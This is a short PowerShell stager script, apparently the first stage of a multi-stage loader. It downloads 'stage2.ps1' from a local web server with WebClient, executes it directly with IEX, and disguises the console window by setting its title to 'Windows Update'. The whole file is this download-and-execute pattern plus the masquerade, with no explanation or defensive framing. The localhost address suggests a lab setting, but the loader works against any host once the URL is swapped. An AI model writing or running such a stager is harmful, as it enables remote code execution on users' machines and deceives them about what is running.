$Stage1Url = "http://localhost:8080/stage2.ps1"
$ScriptText = (New-Object System.Net.WebClient).DownloadString($Stage1Url)
IEX $ScriptText
$Host.UI.RawUI.WindowTitle = "Windows Update"
